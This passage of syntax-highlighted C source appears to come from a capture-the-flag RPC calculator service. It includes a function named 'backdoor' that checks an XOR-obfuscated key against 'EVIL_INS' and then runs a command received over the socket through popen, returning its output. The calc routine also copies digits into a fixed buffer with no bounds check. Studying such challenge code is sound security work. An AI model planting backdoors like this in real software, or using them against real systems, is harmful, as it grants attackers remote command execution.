operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> a <span class="token operator">*</span> b<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'/'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>                array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> b <span class="token operator">/</span> a<span class="token punctuation">;</span>            <span class="token keyword">else</span>                array<span class="token operator">-></span>pool<span class="token punctuation">[</span>array<span class="token operator">-></span>top<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">calc</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> expr<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> result<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>temp<span class="token punctuation">,</span> <span class="token operator">*</span>str<span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> dest<span class="token punctuation">[</span>BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>        stack opt<span class="token punctuation">;</span>        stack array<span class="token punctuation">;</span>    <span class="token punctuation">}</span> var<span class="token punctuation">;</span>  var<span class="token punctuation">.</span>array<span class="token punctuation">.</span>top <span class="token operator">=</span> LENGTH<span class="token punctuation">;</span>  var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top <span class="token operator">=</span> LENGTH<span class="token punctuation">;</span>  <span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> tmp <span class="token operator">=</span> <span class="token function">StrTrim</span><span class="token punctuation">(</span>expr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>BUF_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">,</span>tmp<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> size <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">input_pass</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  str <span class="token operator">=</span> var<span class="token punctuation">.</span>buf<span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>str <span class="token operator">-</span> var<span class="token punctuation">.</span>buf <span class="token operator">&lt;</span> size<span class="token punctuation">)</span>   <span class="token punctuation">{</span>    temp <span class="token operator">=</span> var<span class="token punctuation">.</span>dest<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>str <span class="token operator">-</span> var<span class="token punctuation">.</span>buf <span class="token operator">&lt;</span> size <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>str <span class="token operator">>=</span> <span class="token string">'0'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>str <span class="token operator">&lt;=</span> <span class="token string">'9'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token operator">*</span>temp <span class="token operator">=</span> <span class="token operator">*</span>str<span class="token punctuation">;</span>        temp<span class="token operator">++</span><span class="token punctuation">;</span>        str<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span>temp <span class="token operator">=</span> <span class="token string">'\x00'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>var<span class="token punctuation">.</span>dest<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> num <span class="token operator">=</span> <span class="token function">myatoi</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>array<span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>pool<span class="token punctuation">[</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'('</span> <span class="token operator">||</span> <span class="token function">priority</span><span class="token punctuation">(</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>pool<span class="token punctuation">[</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token function">priority</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span>str <span class="token operator">!=</span> <span class="token string">')'</span><span class="token punctuation">)</span>                                    <span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span>                var<span class="token punctuation">.</span>opt<span class="token punctuation">.</span>top<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">deal_data</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>var<span class="token punctuation">.</span>array<span class="token punctuation">,</span> <span class="token operator">&amp;</span>var<span class="token punctuation">.</span>opt<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>str <span class="token operator">==</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    str<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">sprintf</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token string">"%lld"</span><span class="token punctuation">,</span> var<span class="token punctuation">.</span>array<span class="token punctuation">.</span>pool<span class="token punctuation">[</span>var<span class="token punctuation">.</span>array<span class="token punctuation">.</span>top<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">construct_result</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> length <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> packet <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token punctuation">(</span>length<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>packet<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>length<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"RPCN"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">p32</span><span class="token punctuation">(</span>length<span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"\x00\x00\xbe\xf2"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">p32</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>packet<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span>key<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> packet<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">magiccmp</span><span class="token punctuation">(</span>byte b1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> byte b2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>b1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span>b2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> key<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">36</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>k<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">;</span>    k<span class="token operator">+</span><span class="token operator">=</span><span class="token number">23</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">bytecmp</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> a<span class="token punctuation">,</span><span class="token keyword">char</span><span class="token operator">*</span> b<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> length <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">!=</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token keyword">int</span> sock<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> retry_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xf1"</span><span class="token punctuation">;</span>  byte<span class="token operator">*</span> buf  <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">37</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> cmd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> key_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>key_len<span class="token operator">!=</span><span class="token number">36</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>key<span class="token punctuation">,</span> key_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">encrypt</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bytecmp</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span>EVIL_INS<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> cmd_len <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>cmd_len<span class="token operator">></span><span class="token number">22</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">read</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>cmd<span class="token punctuation">,</span> cmd_len<span class="token punctuation">)</span><span class="token punctuation">;</span>  FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> output <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fp <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>      <span class="token function">fgets</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> output<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">pclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> retry_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockConn<span class="token punctuation">,</span> MQ mq<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> starting <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> error_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xf0"</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> retry_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xf1"</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> done_packet<span class="token operator">=</span><span class="token string">"RPCN\x00\x00\x00\x0c\x00\x00\xbe\xef"</span><span class="token punctuation">;</span>  <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    byte<span class="token operator">*</span> buf  <span class="token operator">=</span> <span class="token punctuation">(</span>byte<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">magiccmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span>RECV_MAGIC<span class="token punctuation">)</span><span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> length <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">read</span><span class="token punctuation">(</span>sockConn<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> packet_type <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> key_len<span class="token punctuation">,</span> id_len<span class="token punctuation">,</span> expr_len<span class="token punctuation">,</span> res_len<span class="token punctuation">,</span> status<span class="token punctuation">,</span> i<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">37</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">memset</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">37</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      string skey<span class="token punctuation">;</span>      string s_corr_id<span class="token punctuation">;</span>      string s_res<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> corr_id<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> packet<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> expr<span class="token punctuation">;</span>      <span class="token keyword">char</span><span class="token operator">*</span> res<span class="token punctuation">;</span>      Q q<span class="token punctuation">;</span>      Data d<span class="token punctuation">;</span>      <span class="token keyword">switch</span><span class="token punctuation">(</span>packet_type<span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// connect</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>starting <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>          <span class="token punctuation">{</span>            starting <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> done_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">else</span>          <span class="token punctuation">{</span>            <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> error_packet<span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">// declare</span>          uuid_t uuid<span class="token punctuation">;</span>          <span class="token function">uuid_generate</span><span class="token 